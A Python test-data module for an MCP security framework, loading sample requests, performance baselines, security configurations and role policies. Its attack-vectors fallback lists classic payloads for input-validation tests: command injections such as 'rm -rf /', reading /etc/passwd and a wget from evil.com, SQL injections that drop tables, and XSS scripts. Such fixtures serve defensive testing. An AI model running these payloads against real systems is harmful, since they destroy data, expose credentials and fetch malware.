"""Test data files and samples for SMCP v1 tests.

This package contains static test data files, sample configurations,
and reference datasets used across different test categories.

Contents:
- sample_requests.json: Sample MCP requests for testing
- attack_vectors.json: Known attack patterns and payloads
- performance_baselines.json: Performance baseline measurements
- test_configurations.json: Test configuration templates
- security_policies.json: Sample security policy configurations
"""

import json
import os
from typing import Dict, Any, List

# Get the directory containing this file
DATA_DIR = os.path.dirname(os.path.abspath(__file__))


def load_json_data(filename: str) -> Dict[str, Any]:
    """Load JSON data from the data directory.
    
    Args:
        filename: Name of the JSON file to load
        
    Returns:
        Loaded JSON data
    """
    filepath = os.path.join(DATA_DIR, filename)
    
    if not os.path.exists(filepath):
        raise FileNotFoundError(f"Test data file not found: {filename}")
    
    with open(filepath, 'r', encoding='utf-8') as f:
        return json.load(f)


def get_sample_requests() -> List[Dict[str, Any]]:
    """Get sample MCP requests for testing.
    
    Returns:
        List of sample MCP requests
    """
    try:
        return load_json_data('sample_requests.json')
    except FileNotFoundError:
        # Return default samples if file doesn't exist
        return [
            {
                "jsonrpc": "2.0",
                "id": "sample-1",
                "method": "tools/list",
                "params": {}
            },
            {
                "jsonrpc": "2.0",
                "id": "sample-2",
                "method": "tools/call",
                "params": {
                    "name": "calculator",
                    "arguments": {"expression": "2 + 2"}
                }
            },
            {
                "jsonrpc": "2.0",
                "id": "sample-3",
                "method": "resources/read",
                "params": {
                    "uri": "file://test.txt"
                }
            }
        ]


def get_attack_vectors() -> Dict[str, List[str]]:
    """Get known attack vectors for security testing.
    
    Returns:
        Dictionary of attack types and their payloads
    """
    try:
        return load_json_data('attack_vectors.json')
    except FileNotFoundError:
        # Return default attack vectors if file doesn't exist
        return {
            "command_injection": [
                "ls; rm -rf /",
                "$(cat /etc/passwd)",
                "; wget http://evil.com/malware"
            ],
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users;--",
                "' UNION SELECT * FROM passwords--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ]
        }


def get_performance_baselines() -> Dict[str, Any]:
    """Get performance baseline measurements.
    
    Returns:
        Performance baseline data
    """
    try:
        return load_json_data('performance_baselines.json')
    except FileNotFoundError:
        # Return default baselines if file doesn't exist
        return {
            "input_validation": {
                "avg_latency_ms": 0.5,
                "max_latency_ms": 2.0,
                "throughput_rps": 10000
            },
            "authentication": {
                "avg_latency_ms": 1.0,
                "max_latency_ms": 5.0,
                "throughput_rps": 5000
            },
            "full_framework": {
                "avg_latency_ms": 5.0,
                "max_latency_ms": 20.0,
                "throughput_rps": 1000
            }
        }


def get_test_configurations() -> Dict[str, Any]:
    """Get test configuration templates.
    
    Returns:
        Test configuration data
    """
    try:
        return load_json_data('test_configurations.json')
    except FileNotFoundError:
        # Return default configurations if file doesn't exist
        return {
            "minimal_security": {
                "enable_input_validation": True,
                "validation_strictness": "minimal",
                "enable_mfa": False,
                "enable_rbac": False,
                "enable_rate_limiting": False,
                "enable_encryption": False,
                "enable_ai_immune": False,
                "enable_audit_logging": False
            },
            "standard_security": {
                "enable_input_validation": True,
                "validation_strictness": "standard",
                "enable_mfa": False,
                "enable_rbac": True,
                "enable_rate_limiting": True,
                "enable_encryption": True,
                "enable_ai_immune": True,
                "enable_audit_logging": True
            },
            "maximum_security": {
                "enable_input_validation": True,
                "validation_strictness": "maximum",
                "enable_mfa": True,
                "enable_rbac": True,
                "enable_rate_limiting": True,
                "enable_encryption": True,
                "enable_ai_immune": True,
                "enable_audit_logging": True
            }
        }


def get_security_policies() -> Dict[str, Any]:
    """Get sample security policy configurations.
    
    Returns:
        Security policy data
    """
    try:
        return load_json_data('security_policies.json')
    except FileNotFoundError:
        # Return default policies if file doesn't exist
        return {
            "roles": {
                "guest": {
                    "permissions": ["mcp:read:public"]
                },
                "user": {
                    "permissions": ["mcp:read", "mcp:execute:safe_tools"]
                },
                "power_user": {
                    "permissions": ["mcp:read", "mcp:write", "mcp:execute:all_tools"]
                },
                "admin": {
                    "permissions": ["mcp:*", "system:*", "security:*"]
                }
            },
            "rate_limits": {
                "guest": {"requests_per_minute": 10},
                "user": {"requests_per_minute": 100},
                "power_user": {"requests_per_minute": 500},
                "admin": {"requests_per_minute": 1000}
            },
            "validation_rules": {
                "max_request_size": 1048576,  # 1MB
                "max_nesting_depth": 10,
                "allowed_methods": [
                    "tools/list", "tools/call",
                    "resources/list", "resources/read",
                    "prompts/list", "prompts/get"
                ]
            }
        }


# Export commonly used data
__all__ = [
    "load_json_data",
    "get_sample_requests",
    "get_attack_vectors",
    "get_performance_baselines",
    "get_test_configurations",
    "get_security_policies",
    "DATA_DIR"
]
